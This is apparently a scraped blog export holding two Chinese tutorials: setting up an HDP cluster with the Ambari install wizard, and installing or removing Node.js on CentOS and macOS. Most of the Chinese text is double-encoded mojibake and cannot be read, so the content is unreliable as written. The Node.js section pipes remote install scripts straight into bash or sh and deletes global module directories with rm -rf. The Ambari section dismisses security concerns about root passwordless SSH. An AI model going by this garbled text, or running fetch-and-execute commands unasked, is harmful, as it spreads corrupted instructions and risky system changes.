2.å¯åŠ¨Ambariå®‰è£…å‘å¯¼ä»Ambari Welcomeé¡µé¢ï¼Œé€‰æ‹©å¯åŠ¨å®‰è£…å‘å¯¼ã€‚ æä¾›é›†ç¾¤ï¼Œç®¡ç†è°å¯ä»¥è®¿é—®ç¾¤é›†ï¼Œä»¥åŠè‡ªå®šä¹‰è§†å›¾ä¸ºAmbariç”¨æˆ·ã€‚ 3.å‘½åæ‚¨çš„ç¾¤é›†åœ¨Name your clusterï¼Œé”®å…¥è¦åˆ›å»ºçš„é›†ç¾¤çš„åç§°ã€‚åç§°ä¸­ä¸è¦ä½¿ç”¨ç©ºæ ¼æˆ–ç‰¹æ®Šå­—ç¬¦ã€‚ é€‰æ‹©Nextã€‚ 4.é€‰æ‹©ç‰ˆæœ¬ è¿™é‡Œæˆ‘é€‰æ‹©redhat6 å…¶ä»–çš„éƒ½removeæ‰ã€‚ åœ¨æ­¤æ­¥éª¤ä¸­ï¼Œæ‚¨å°†é€‰æ‹©ç¾¤é›†çš„è½¯ä»¶ç‰ˆæœ¬å’Œäº¤ä»˜æ–¹å¼ã€‚ä½¿ç”¨å…¬å…±å­˜å‚¨åº“éœ€è¦Internetè¿æ¥ã€‚ä½¿ç”¨æœ¬åœ°å­˜å‚¨åº“éœ€è¦æ‚¨åœ¨ç½‘ç»œä¸­å¯ç”¨çš„å­˜å‚¨åº“ä¸­é…ç½®è½¯ä»¶ã€‚ é€‰æ‹©å †æ ˆ å¯ç”¨çš„HDPç‰ˆæœ¬æ˜¾ç¤ºåœ¨TABä¸­ã€‚å½“æ‚¨é€‰æ‹©TABæ—¶ï¼ŒAmbariä¼šå°è¯•å‘ç°è¯¥HDPå †æ ˆçš„ç‰¹å®šç‰ˆæœ¬å¯ç”¨ã€‚è¯¥åˆ—è¡¨æ˜¾ç¤ºåœ¨DROPDOWNä¸­ã€‚å¯¹äºè¯¥ç‰¹å®šç‰ˆæœ¬ï¼Œå°†æ˜¾ç¤ºå¯ç”¨çš„æœåŠ¡ï¼Œå…¶ä¸­çš„ç‰ˆæœ¬æ˜¾ç¤ºåœ¨TABLEä¸­ã€‚ é€‰æ‹©ç‰ˆæœ¬ å¦‚æœAmbariå¯ä»¥è®¿é—®Internetï¼Œåˆ™ç‰¹å®šç‰ˆæœ¬å°†ä½œä¸ºé€‰é¡¹åˆ—åœ¨DROPDOWNä¸­ã€‚å¦‚æœæ‚¨æœ‰æœªåˆ—å‡ºçš„ç‰ˆæœ¬çš„ç‰ˆæœ¬å®šä¹‰æ–‡ä»¶ï¼Œæ‚¨å¯ä»¥å•å‡»æ·»åŠ ç‰ˆæœ¬â€¦å¹¶ä¸Šè½½VDFæ–‡ä»¶ã€‚æ­¤å¤–ï¼Œå¦‚æœæ‚¨æ— æ³•è®¿é—®Internetæˆ–ä¸ç¡®å®šè¦å®‰è£…å“ªä¸ªç‰¹å®šç‰ˆæœ¬ï¼Œåˆ™ é»˜è®¤ç‰ˆæœ¬å®šä¹‰ä¹ŸåŒ…å«åœ¨åˆ—è¡¨ä¸­ã€‚ é€‰æ‹©å­˜å‚¨åº“ Ambariå…è®¸æ‚¨é€‰æ‹©ä»å…¬å…±å­˜å‚¨åº“ï¼ˆå¦‚æœæ‚¨æœ‰Internetè®¿é—®æƒé™ï¼‰æˆ–æœ¬åœ°å­˜å‚¨åº“å®‰è£…è½¯ä»¶ã€‚æ— è®ºæ‚¨çš„é€‰æ‹©å¦‚ä½•ï¼Œæ‚¨éƒ½å¯ä»¥ç¼–è¾‘å­˜å‚¨åº“çš„åŸºæœ¬URLã€‚å°†æ˜¾ç¤ºå¯ç”¨çš„æ“ä½œç³»ç»Ÿï¼Œæ‚¨å¯ä»¥ä»åˆ—è¡¨ä¸­æ·»åŠ /åˆ é™¤æ“ä½œç³»ç»Ÿä»¥é€‚åˆæ‚¨çš„ç¯å¢ƒ â—ï¸â—ï¸æ³¨æ„UIæ˜¾ç¤ºåŸºäºæ“ä½œç³»ç»Ÿç³»åˆ—ï¼ˆOSç³»åˆ—ï¼‰çš„å­˜å‚¨åº“åŸºæœ¬URLã€‚è¯·ç¡®ä¿åŸºäºæ­£åœ¨è¿è¡Œçš„æ“ä½œç³»ç»Ÿè®¾ç½®æ­£ç¡®çš„æ“ä½œç³»ç»Ÿç³»åˆ—ã€‚ä¸‹è¡¨å°†OSç³»åˆ—æ˜ å°„åˆ°æ“ä½œç³»ç»Ÿã€‚ é«˜çº§é€‰é¡¹ æœ‰é«˜çº§å­˜å‚¨åº“é€‰é¡¹å¯ç”¨ã€‚ è·³è¿‡å­˜å‚¨åº“åŸºæœ¬URLéªŒè¯ï¼ˆé«˜çº§ï¼‰ï¼š å½“æ‚¨å•å‡»ä¸‹ä¸€æ­¥æ—¶ï¼ŒAmbariå°†å°è¯•è¿æ¥åˆ°å­˜å‚¨åº“åŸºæœ¬URLï¼Œå¹¶éªŒè¯æ‚¨å·²è¾“å…¥éªŒè¯å­˜å‚¨åº“ã€‚å¦‚æœæ²¡æœ‰ï¼Œå°†æ˜¾ç¤ºä¸€ä¸ªé”™è¯¯ï¼Œæ‚¨å¿…é¡»åœ¨ç»§ç»­ä¹‹å‰çº æ­£ã€‚ ä½¿ç”¨RedHat Satellite/Spacewalkï¼šä»…å½“è®¡åˆ’ä½¿ç”¨æœ¬åœ°å­˜å‚¨åº“æ—¶ï¼Œæ‰ä¼šå¯ç”¨æ­¤é€‰é¡¹ã€‚å½“æ‚¨ä¸ºè½¯ä»¶å­˜å‚¨åº“é€‰æ‹©æ­¤é€‰é¡¹æ—¶ï¼Œæ‚¨è´Ÿè´£é…ç½®Satellite/Spacewalkä¸­çš„å­˜å‚¨åº“é€šé“ï¼Œå¹¶ç¡®è®¤æ‰€é€‰ç¾¤é›†ç‰ˆæœ¬çš„å­˜å‚¨åº“åœ¨ç¾¤é›†ä¸­çš„ä¸»æœºä¸Šå¯ç”¨ã€‚ 5.å®‰è£…é€‰é¡¹ä¸ºäº†æ„å»ºé›†ç¾¤ï¼Œå®‰è£…å‘å¯¼å°†æç¤ºæ‚¨æœ‰å…³å¦‚ä½•è®¾ç½®å®ƒçš„ä¸€èˆ¬ä¿¡æ¯ã€‚æ‚¨éœ€è¦æä¾›æ¯ä¸ªä¸»æœºçš„FQDNã€‚è¯¥å‘å¯¼è¿˜éœ€è¦è®¿é—®åœ¨è®¾ç½®æ— å¯†ç SSHä¸­åˆ›å»ºçš„ç§é’¥æ–‡ä»¶ ã€‚ä½¿ç”¨ä¸»æœºåå’Œå¯†é’¥æ–‡ä»¶ä¿¡æ¯ï¼Œå‘å¯¼å¯ä»¥å®šä½ï¼Œè®¿é—®å’Œä¸ç¾¤é›†ä¸­çš„æ‰€æœ‰ä¸»æœºå®‰å…¨äº¤äº’ã€‚ ä½¿ç”¨Target Hostsæ–‡æœ¬æ¡†è¾“å…¥ä¸»æœºååˆ—è¡¨ï¼Œæ¯è¡Œä¸€ä¸ªã€‚æ‚¨å¯ä»¥ä½¿ç”¨æ‹¬å·å†…çš„èŒƒå›´æ¥è¡¨ç¤ºè¾ƒå¤§çš„ä¸»æœºé›†ã€‚ä¾‹å¦‚ï¼Œå¯¹äºhost01.domainé€šè¿‡host10.domainä½¿ç”¨ host[01-10].domain âš ï¸ å®‰è£…æœåŠ¡å™¨é›†ç¾¤æœºå™¨ä¸€å®šè¦ç³»ç»Ÿç‰ˆæœ¬è¦ä¸€è‡´ä¸ç„¶å®‰è£…ä¼šæç¤ºç‰ˆæœ¬ä¸å…¼å®¹ã€‚ â—ï¸â—ï¸ æ³¨æ„å¦‚æœè¦åœ¨EC2ä¸Šéƒ¨ç½²ï¼Œè¯·ä½¿ç”¨å†…éƒ¨ä¸“ç”¨DNSä¸»æœºåã€‚ åœ¨ambariæœåŠ¡å™¨é…ç½®hosts vim /etc/hosts 12192.168.1.151 datanode151192.168.1.173 datanode_173 datanode-173.hadoop å¦‚æœè¦è®©Ambariä½¿ç”¨SSHåœ¨æ‰€æœ‰ä¸»æœºä¸Šè‡ªåŠ¨å®‰è£…Ambariä»£ç†ï¼Œè¯·é€‰æ‹©Provide your SSH Private Keyå¹¶ä½¿ç”¨éƒ¨åˆ†ä¸­çš„ Choose FileæŒ‰é’®Host Registration InformationæŸ¥æ‰¾ä¸å…ˆå‰åœ¨æ‰€æœ‰ä¸»æœºä¸Šå®‰è£…çš„å…¬é’¥ç›¸åŒ¹é…çš„ç§é’¥æ–‡ä»¶ï¼Œæˆ–è€…å‰ªåˆ‡å¹¶ç²˜è´´é”®æ‰‹åŠ¨æ’å…¥æ–‡æœ¬æ¡†ã€‚ å¡«å†™æ‚¨é€‰æ‹©çš„SSHå¯†é’¥çš„ç”¨æˆ·åã€‚å¦‚æœä¸æƒ³ä½¿ç”¨rootç”¨æˆ·ï¼Œåˆ™å¿…é¡»ä¸ºå¯ä»¥åœ¨ä¸è¾“å…¥å¯†ç çš„æƒ…å†µä¸‹æ‰§è¡Œsudoçš„å¸æˆ·æä¾›ç”¨æˆ·åã€‚å¦‚æœæ‚¨çš„ç¯å¢ƒä¸­çš„ä¸»æœºä¸Šçš„SSHé…ç½®ä¸º22ä»¥å¤–çš„ç«¯å£ï¼Œæ‚¨ä¹Ÿå¯ä»¥æ›´æ”¹å®ƒã€‚ å¦‚æœæ‚¨ä¸å¸Œæœ›Ambariè‡ªåŠ¨å®‰è£…Ambariä»£ç†ï¼Œè¯·é€‰æ‹©Perform manual registrationã€‚æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…æ‰‹åŠ¨å®‰è£…Ambariä»£ç†ã€‚ é€‰æ‹©Register and Confirmç»§ç»­ã€‚ è¿™é‡Œæç¤ºï¼šThe following hostnames are not valid FQDNs: datanode_173.hadoop è¿™é‡Œè·³è½¬åˆ°å®‰è£…é¡µé¢ï¼šå‘ç°æŠ¥é”™æç¤ºdatanode-173.hadoopä¸»æœºè®¿é—®Ambariæœºå™¨ä¸èƒ½è®¿é—®ã€‚ 6.ç¡®è®¤ä¸»æœºConfirm Hosts æç¤ºæ‚¨ç¡®è®¤Ambariå·²ä¸ºæ‚¨çš„é›†ç¾¤æ‰¾åˆ°æ­£ç¡®çš„ä¸»æœºï¼Œå¹¶æ£€æŸ¥è¿™äº›ä¸»æœºä»¥ç¡®ä¿å®ƒä»¬å…·æœ‰ç»§ç»­å®‰è£…æ‰€éœ€çš„æ­£ç¡®ç›®å½•ï¼Œè½¯ä»¶åŒ…å’Œè¿›ç¨‹ã€‚ å¦‚æœé€‰æ‹©äº†é”™è¯¯çš„ä¸»æœºï¼Œæ‚¨å¯ä»¥é€šè¿‡é€‰æ‹©ç›¸åº”çš„å¤é€‰æ¡†å¹¶å•å‡»ç°è‰²Remove SelectedæŒ‰é’®æ¥åˆ é™¤å®ƒä»¬ã€‚è¦åˆ é™¤å•ä¸ªä¸»æœºï¼Œè¯·å•å‡»Removeâ€œæ“ä½œâ€åˆ—ä¸­çš„å°ç™½è‰²æŒ‰é’®ã€‚ åœ¨å±å¹•åº•éƒ¨ï¼Œæ‚¨å¯èƒ½ä¼šæ³¨æ„åˆ°ä¸€ä¸ªé»„è‰²æ¡†ï¼Œè¡¨ç¤ºåœ¨æ£€æŸ¥è¿‡ç¨‹ä¸­é‡åˆ°äº†ä¸€äº›è­¦å‘Šã€‚ä¾‹å¦‚ï¼Œæ‚¨çš„ä¸»æœºå¯èƒ½å·²æœ‰wgetæˆ–çš„å‰¯æœ¬ curlã€‚é€‰æ‹©Click here to see the warnings æŸ¥çœ‹æ£€æŸ¥å†…å®¹å’Œå¯¼è‡´è­¦å‘Šçš„åŸå› çš„åˆ—è¡¨ã€‚è­¦å‘Šé¡µé¢è¿˜æä¾›å¯¹pythonè„šæœ¬çš„è®¿é—®ï¼Œå¯ä»¥å¸®åŠ©æ‚¨æ¸…é™¤å¯èƒ½é‡åˆ°çš„ä»»ä½•é—®é¢˜ï¼Œè®©æ‚¨è¿è¡ŒRerun Checksã€‚ åœ¨datanode_173æœåŠ¡å™¨é…ç½®hosts vim /etc/hosts 12192.168.1.151 datanode151192.168.1.173 datanode_173 datanode-173.hadoop æ¯å°èŠ‚ç‚¹é‡Œé…ç½®FQDNï¼Œå¦‚ä¸‹ä»¥ä¸»èŠ‚ç‚¹ä¸ºä¾‹ 123vi /etc/sysconfig/networkNETWORKING=yesHOSTNAME=SY-001.hadoop é…ç½®ä¸Šå°±å¯ä»¥äº†ã€‚ æŠŠdatanode151ä¹Ÿæ˜¯ambariæœºå™¨é…ç½®åœ¨hostså°±å¯ä»¥äº†ã€‚ æœ€å¥½è®¾ç½®rootçš„æ— å¯†ç ç™»å½•ï¼Œå› ä¸ºæˆ‘ä»¬é…ç½®çš„é›†ç¾¤éƒ½æ˜¯å†…ç½‘çš„ï¼Œæ²¡ä»€ä¹ˆå®‰å…¨æ€§é—®é¢˜ï¼Œä½¿ç”¨rootæ“ä½œå¯ä»¥çœå»ä¸€äº›éº»çƒ¦ï¼Œérootç”¨æˆ·å¯èƒ½åœ¨å®‰è£…Hadoopç»„ä»¶æ—¶ä¸èƒ½æˆåŠŸ ä¸‹é¢æ˜¯æˆ‘å®‰è£…è¿™é‡Œæç¤ºæ²¡æœ‰æ‰¾åˆ°æ–‡ä»¶ç›®å½•æŸ¥çœ‹å®‰è£…æŠ¥é”™æ“ä½œï¼š mkdir /var/lib/ambari-agent/data 7.é€‰æ‹©æœåŠ¡å°†çœ‹åˆ°é€‰æ‹©è¦å®‰è£…åˆ°ç¾¤é›†ä¸­çš„æœåŠ¡ã€‚HDPå †æ ˆåŒ…æ‹¬è®¸å¤šæœåŠ¡ã€‚æ‚¨å¯ä»¥é€‰æ‹©ç«‹å³å®‰è£…ä»»ä½•å…¶ä»–å¯ç”¨æœåŠ¡ï¼Œæˆ–ç¨åæ·»åŠ æœåŠ¡ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå®‰è£…å‘å¯¼å°†é€‰æ‹©æ‰€æœ‰å¯ç”¨çš„æœåŠ¡è¿›è¡Œå®‰è£…ã€‚ é€‰æ‹©noneæ¸…é™¤æ‰€æœ‰é€‰æ‹©ï¼Œæˆ–é€‰æ‹© allé€‰æ‹©æ‰€æœ‰åˆ—å‡ºçš„æœåŠ¡ã€‚ é€‰æ‹©æˆ–æ¸…é™¤å•ä¸ªå¤é€‰æ¡†ä»¥å®šä¹‰ä¸€ç»„è¦ç«‹å³å®‰è£…çš„æœåŠ¡ã€‚ é€‰æ‹©è¦ç«‹å³å®‰è£…çš„æœåŠ¡åï¼Œé€‰æ‹©Nextã€‚ 8.åˆ†é…ä¸»ç«™Ambariå®‰è£…å‘å¯¼ä¼šå°†æ‰€é€‰æœåŠ¡çš„ä¸»ç»„ä»¶åˆ†é…ç»™é›†ç¾¤ä¸­çš„ç›¸åº”ä¸»æœºï¼Œå¹¶åœ¨Assign Mastersä¸­æ˜¾ç¤ºåˆ†é…ã€‚å·¦åˆ—æ˜¾ç¤ºæœåŠ¡å’Œå½“å‰ä¸»æœºã€‚å³åˆ—æ˜¾ç¤ºä¸»æœºçš„å½“å‰ä¸»ç»„ä»¶åˆ†é…ï¼ŒæŒ‡ç¤ºæ¯ä¸ªä¸»æœºä¸Šå®‰è£…çš„CPUå†…æ ¸æ•°é‡å’ŒRAMæ•°é‡ã€‚ è¦æ›´æ”¹æœåŠ¡çš„ä¸»æœºåˆ†é…ï¼Œè¯·ä»è¯¥æœåŠ¡çš„ä¸‹æ‹‰èœå•ä¸­é€‰æ‹©ä¸»æœºåã€‚ è¦åˆ é™¤ZooKeeperå®ä¾‹ï¼Œè¯·å•å‡»è¦åˆ é™¤çš„ä¸»æœºåœ°å€æ—è¾¹çš„ç»¿è‰²å‡å·å›¾æ ‡ã€‚ å½“æ‚¨å¯¹ä½œä¸šæ„Ÿåˆ°æ»¡æ„æ—¶ï¼Œé€‰æ‹©Nextã€‚ 9.åˆ†é…ä»å±å’Œå®¢æˆ·ç«¯Ambariå®‰è£…å‘å¯¼å°†ä»å±ç»„ä»¶ï¼ˆDataNodesï¼ŒNodeManagerå’ŒRegionServersï¼‰åˆ†é…ç»™é›†ç¾¤ä¸­çš„ç›¸åº”ä¸»æœºã€‚å®ƒè¿˜ä¼šå°è¯•é€‰æ‹©ä¸»æœºä»¥å®‰è£…é€‚å½“çš„å®¢æˆ·ç«¯é›†ã€‚ ä½¿ç”¨allæˆ–noneå¯åˆ†åˆ«é€‰æ‹©åˆ—ä¸­çš„æ‰€æœ‰ä¸»æœºæˆ–ä¸é€‰æ‹©ä»»ä½•ä¸»æœºã€‚ å¦‚æœä¸»æœºæ—è¾¹æœ‰æ˜Ÿå·ï¼Œåˆ™è¯¥ä¸»æœºä¹Ÿè¿è¡Œä¸€ä¸ªæˆ–å¤šä¸ªä¸»ç»„ä»¶ã€‚å°†é¼ æ ‡æ‚¬åœåœ¨æ˜Ÿå·ä¸Šï¼Œä»¥æŸ¥çœ‹è¯¥ä¸»æœºä¸Šçš„å“ªäº›ä¸»ç»„ä»¶ã€‚ é€šè¿‡ä½¿ç”¨ç‰¹å®šä¸»æœºæ—è¾¹çš„å¤é€‰æ¡†æ¥å¾®è°ƒæ‚¨çš„é€‰æ‹©ã€‚ å½“ä½ å¯¹ä½ çš„ä½œä¸šæ„Ÿåˆ°æ»¡æ„æ—¶ï¼Œé€‰æ‹©Nextã€‚ 10.è‡ªå®šä¹‰æœåŠ¡è‡ªå®šä¹‰æœåŠ¡æ­¥éª¤ä¸ºæ‚¨æä¾›ä¸€ç»„é€‰é¡¹å¡ï¼Œæ‚¨å¯ä»¥æŸ¥çœ‹å’Œä¿®æ”¹HDPé›†ç¾¤è®¾ç½®ã€‚å‘å¯¼ä¼šå°è¯•ä¸ºæ¯ä¸ªé€‰é¡¹è®¾ç½®åˆç†çš„é»˜è®¤å€¼ã€‚ä½ æ˜¯å¼ºçƒˆå»ºè®®ï¼Œä»¥æ£€æŸ¥è¿™äº›è®¾ç½®ä¸ºæ‚¨çš„è¦æ±‚å¯èƒ½ç•¥æœ‰ä¸åŒã€‚ æµè§ˆæ¯ä¸ªæœåŠ¡æ ‡ç­¾ï¼Œç„¶åå°†å…‰æ ‡æ‚¬åœåœ¨æ¯ä¸ªå±æ€§ä¸Šï¼Œæ‚¨å¯ä»¥çœ‹åˆ°å±æ€§åšä»€ä¹ˆçš„ç®€è¦è¯´æ˜ã€‚æ˜¾ç¤ºçš„æœåŠ¡é€‰é¡¹å¡æ•°å–å†³äºæ‚¨å†³å®šåœ¨ç¾¤é›†ä¸­å®‰è£…çš„æœåŠ¡ã€‚ä»»ä½•éœ€è¦è¾“å…¥çš„é€‰é¡¹å¡éƒ½ä¼šæ˜¾ç¤ºä¸€ä¸ªçº¢è‰²å¾½ç« ï¼Œå…¶ä¸­åŒ…å«éœ€è¦æ³¨æ„çš„å±æ€§æ•°ã€‚é€‰æ‹©æ˜¾ç¤ºçº¢è‰²å¾½ç« ç¼–å·çš„æ¯ä¸ªæœåŠ¡é€‰é¡¹å¡ï¼Œç„¶åè¾“å…¥ç›¸åº”çš„ä¿¡æ¯ã€‚ ç›®å½• HDPå°†å­˜å‚¨ä¿¡æ¯çš„ç›®å½•çš„é€‰æ‹©æ˜¯è‡³å…³é‡è¦çš„ã€‚Ambariå°†å°è¯•æ ¹æ®æ‚¨ç¯å¢ƒä¸­å¯ç”¨çš„å®‰è£…ç‚¹é€‰æ‹©åˆç†çš„é»˜è®¤å€¼ï¼Œä½†å¼ºçƒˆå»ºè®®æ‚¨æŸ¥çœ‹Ambariæ¨èçš„é»˜è®¤ç›®å½•è®¾ç½®ã€‚ç‰¹åˆ«æ˜¯ï¼Œç¡®è®¤ç›®å½•ï¼Œä¾‹å¦‚/tmpå’Œ /varè¢«ä¸è¢«ç”¨äºä¸‹HDFSçš„NameNodeç›®å½•å’Œæ•°æ®ç®¡ç†éƒ¨ç›®å½•HDFSæ ‡ç­¾ã€‚ å¯†ç  æ‚¨å¿…é¡»ä¸ºHiveå’ŒOozieæœåŠ¡ä»¥åŠKnoxçš„ä¸»å¯†é’¥æä¾›æ•°æ®åº“å¯†ç ã€‚ä½¿ç”¨Hiveä½œä¸ºç¤ºä¾‹ï¼Œé€‰æ‹©Hiveé€‰é¡¹å¡å¹¶å±•å¼€é«˜çº§éƒ¨åˆ†ã€‚åœ¨ä»¥çº¢è‰²æ ‡è®°çš„æ•°æ®åº“å¯†ç å­—æ®µä¸­ï¼Œæä¾›å¯†ç ï¼Œç„¶åé‡æ–°é”®å…¥ä»¥ç¡®è®¤ã€‚ å®‰è£…å„ä¸ªæœåŠ¡ï¼Œå¹¶ä¸”å®Œæˆå®‰è£…åä¼šå¯åŠ¨ç›¸å…³æœåŠ¡ï¼Œå®‰è£…è¿‡ç¨‹æ¯”è¾ƒé•¿ï¼Œå¦‚ä¸­ä¸­å‡ºç°é”™è¯¯ï¼Œæ ¹æ®å…·ä½“æä¾›æˆ–æ—¥å¿—è¿›è¡Œæ“ä½œã€‚ è¿™é‡Œæˆ‘å°±ä¸è´´å‡ºæ¥äº†ï¼Œå› ä¸ºæµ‹è¯•ç¯å¢ƒæœºå™¨æˆ‘åšæµ‹è¯•ç”¨æœºå™¨é…ç½®ä¸å¤Ÿæ‰€æœ‰åé¢ç»“æœç»éªŒå†™å‡ºæ¥äº†ã€‚ å®‰è£…çš„è¿˜æ˜¯æç¤ºå¤±è´¥ï¼šImportError: No module named rpm å‚è€ƒè¿™ç¯‡æ–‡ç« é‡æ–°å®‰è£…è§£å†³äº†è¿™ä¸ªé—®é¢˜ï¼šImportError: No module named rpm 11.å®‰è£…ï¼Œå¯åŠ¨å’Œæµ‹è¯•å®‰è£…çš„è¿›åº¦å°†æ˜¾ç¤ºåœ¨å±å¹•ä¸Šã€‚Ambariå®‰è£…ï¼Œå¯åŠ¨ï¼Œå¹¶å¯¹æ¯ä¸ªç»„ä»¶è¿è¡Œä¸€ä¸ªç®€å•çš„æµ‹è¯•ã€‚è¿‡ç¨‹çš„æ€»ä½“çŠ¶æ€æ˜¾ç¤ºåœ¨å±å¹•é¡¶éƒ¨çš„è¿›åº¦æ ä¸­ï¼Œä¸»æœºçš„ä¸»æœºçŠ¶æ€æ˜¾ç¤ºåœ¨ä¸»è¦éƒ¨åˆ†ã€‚åœ¨æ­¤è¿‡ç¨‹ä¸­ä¸è¦åˆ·æ–°æµè§ˆå™¨ã€‚åˆ·æ–°æµè§ˆå™¨å¯èƒ½ä¼šä¸­æ–­è¿›åº¦æŒ‡ç¤ºå™¨ã€‚ è¦æŸ¥çœ‹æ¯ä¸ªä¸»æœºå·²å®Œæˆçš„ä»»åŠ¡çš„å…·ä½“ä¿¡æ¯ï¼Œè¯·å•å‡»Messageç›¸åº”ä¸»æœºåˆ—ä¸­çš„é“¾æ¥ã€‚åœ¨ Taskså¼¹å‡ºçª—å£ä¸­ï¼Œå•å‡»å•ä¸ªä»»åŠ¡ä»¥æŸ¥çœ‹ç›¸å…³çš„æ—¥å¿—æ–‡ä»¶ã€‚æ‚¨å¯ä»¥ä½¿ç”¨Showä¸‹æ‹‰åˆ—è¡¨é€‰æ‹©è¿‡æ»¤æ¡ä»¶ã€‚è¦æŸ¥çœ‹æ›´å¤§ç‰ˆæœ¬çš„æ—¥å¿—å†…å®¹ï¼Œè¯·å•å‡»Openå›¾æ ‡æˆ–å°†å†…å®¹å¤åˆ¶åˆ°å‰ªè´´æ¿ï¼Œä½¿ç”¨Copyå›¾æ ‡ã€‚ å®‰è£…å®Œæˆæ•ˆæœå›¾: è®©æˆ‘ä»¬ä»å·¦ä¾§æ æˆ–ä¸‹æ‹‰èœå•ä¸­é€‰æ‹©Yarnè¿›å…¥YARNä¿¡æ¯ä¸­å¿ƒã€‚ æˆ‘ä»¬å°†å¼€å§‹æ›´æ–°çº¿ç¨‹å®¹é‡è°ƒåº¦ç­–ç•¥çš„é…ç½®ã€‚ å‘ä¸‹æ»šåŠ¨åˆ°Scheduleré¡µé¢çš„éƒ¨åˆ†ã€‚é»˜è®¤å®¹é‡è°ƒåº¦ç­–ç•¥åªæœ‰ä¸€ä¸ªé˜Ÿåˆ—ã€‚ è®©æˆ‘ä»¬çœ‹çœ‹è°ƒåº¦ç­–ç•¥ã€‚å‘ä¸Šæ»šåŠ¨åˆ°é¡µé¢é¡¶éƒ¨ï¼Œç„¶åç‚¹å‡»å¿«é€Ÿé“¾æ¥ã€‚ç„¶åä»ä¸‹æ‹‰åˆ—è¡¨ä¸­é€‰æ‹©ResourceManager UIã€‚ æ­£å¦‚ä½ å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬åªæœ‰é»˜è®¤ç­–ç•¥ã€‚ å‚è€ƒå®‰è£…Ambariå®˜ç½‘åœ°å€install Ambariç¼–è¯‘å®‰è£…Ambari 2.4.2å®‰è£…æŒ‡å—","link":"/2017/05/08/Bigdata-hadoop/HORTONW0RKSæ•°æ®å¹³å°å®ç°æ­å»ºAmbarié…ç½®å’Œéƒ¨ç½²HDPé›†ç¾¤ç›‘æ§Hadoopé›†ç¾¤ /"},{"title":"Centos7.1+Macç¯å¢ƒå®‰è£…Node.Jsä»¥åŠå½»åº•åˆ é™¤å¸è½½node.jsæ•™ç¨‹","text":"linux Centos7ç³»ç»Ÿå¿«é€Ÿå®‰è£…node.js npm1234567ç¬¬ä¸€ã€é€‰æ‹©åˆé€‚çš„ç‰ˆæœ¬å®‰è£…# 4.xç‰ˆæœ¬curl --silent --location https://rpm.nodesource.com/setup_4.x | bash -# 5.xç‰ˆæœ¬curl --silent --location https://rpm.nodesource.com/setup_5.x | bash -# 6.xç‰ˆæœ¬curl --silent --location https://rpm.nodesource.com/setup_6.x | bash - å¦‚æœæ˜¯Centos7çš„è¯ä¼šæç¤ºæŠ¥é”™Requires: libhttp_parser.so.2()(64bit) 12345678910111213rpm -ivh https://rpm.nodesource.com/pub_6.x/el/7/x86_64/nodejs-6.2.0-1nodesource.el7.centos.x86_64.rpm[root@H5-nha ~]# node -vv6.2.0[root@H5-nha ~]# npm -v3.8.9rpm -ivh https://kojipkgs.fedoraproject.org//packages/http-parser/2.7.1/3.el7/x86_64/http-parser-2.7.1-3.el7.x86_64.rpm &amp;&amp; yum -y install nodejs[root@logstash kibana-5.5.2]# node -vv6.11.1[root@logstash kibana-5.5.2]# npm -v3.10.10 12Centos6å®‰è£…å‘½ä»¤ï¼šrpm -ivh https://kojipkgs.fedoraproject.org/packages/http-parser/2.6.0/2.fc24/x86_64/http-parser-2.6.0-2.fc24.x86_64.rpm &amp;&amp; yum -y install nodejs Mac OSå®‰è£…: å®‰è£…æŠ¥é”™304ï¼š å®‰è£…Node.Js æŠ¥é”™ 340 è§£å†³æ–¹æ³•Fixing npm On Mac OS X for Homebrew UsersIf you just want to fix the issue quickly, scroll down to the â€œsolutionâ€ section below.Explanation of the issueIf youâ€™re a Homebrew user and you installed node via Homebrew,there is a major philosophical issue with the way Homebrew and NPM work together.If you install node with Homebrew and then try to do npm update npm -g, you may see an error like this: 12345678910111213141516171819202122232425$ npm update npm -g npm http GET https://registry.npmjs.org/npmnpm http 304 https://registry.npmjs.org/npm npm http GET https://registry.npmjs.org/npm/1.4.4 npm http 304 https://registry.npmjs.org/npm/1.4.4 npm ERR! error rolling back Error: Refusing to delete: /usr/local/bin/npm not in /usr/local/lib/nodemodules/npm npm ERR! error rolling back at clobberFail (/usr/local/Cellar/node/0.10.26/lib/nodemodules/npm/lib/utils/gently-rm.js:57:12)npm ERR! error rolling back at next (/usr/local/Cellar/node/0.10.26/lib/nodemodules/npm/lib/utils/gently-rm.js:43:14)npm ERR! error rolling back at /usr/local/Cellar/node/0.10.26/lib/nodemodules/npm/lib/utils/gently-rm.js:52:12npm ERR! error rolling back at Object.oncomplete (fs.js:107:15)npm ERR! error rolling back npm@1.4.4 &#123; [Error: Refusing to delete: /usr/local/bin/npm not in /usr/local/lib/nodemodules/npm] code: 'EEXIST', path: '/usr/local/bin/npm' &#125; npm ERR! Refusing to delete: /usr/local/bin/npm not in /usr/local/lib/nodemodules/npm File exists: /usr/local/bin/npm Move it away, and try again.npm ERR! System Darwin 13.1.0 npm ERR! command \"/usr/local/Cellar/node/0.10.26/bin/node\" \"/usr/local/bin/npm\" \"update\" \"npm\" \"-g\" npm ERR! cwd /Users/dan/Google Drive/Projects/dotfiles npm ERR! node -v v0.10.26 npm ERR! npm -v 1.4.3 npm ERR! path /usr/local/bin/npm npm ERR! code EEXIST npm ERR! npm ERR! Additional logging details can be found in: npm ERR! /Users/dan/Google Drive/Projects/dotfiles/npm-debug.log npm ERR! not ok code 0 Thereâ€™s an NPM bug for this exact problem. The bug has been â€œfixedâ€by Homebrew installing npm in a way that allows it to manage itself once the install is complete. However,this is error-prone and still seems to cause problems for some people.The root of the the issue is really that npm is its own package manager andit is therefore better to have npm manage itself and its packages completely on its own instead of letting Homebrew do it. Also, using the Homebrew installation of npm will require you to use sudo when installing global packages.Since one of the core ideas behind Homebrew is that apps can be installed without giving them root access,this is a bad idea. SolutionThis solution fixes the error caused by trying to run npm update npm -g.Once youâ€™re finished, you also wonâ€™t need to usesudo to install npm modules globally.Before you start, make a note of any globally installed npm packages.These instructions will have you remove all of those packages.After youâ€™re finished youâ€™ll need to re-install them.Run the following commands to remove all existing global npm modules, uninstall node &amp; npm,re-install node with the right defaults, install npm as its own pacakge,and configure the location for global npm modules to be installed. 12345rm -rf /usr/local/lib/node_modules brew uninstall node brew install node --without-npm echo prefix=~/.node &gt;&gt; ~/.npmrc curl -L https://www.npmjs.com/install.sh | sh è¿™é‡Œçš„å®‰è£…è„šæœ¬å¯ä»¥çœ‹æˆ‘çš„GitHub Node and npm should be correctly installed at this point.The final step is to add ~/.node/bin to your 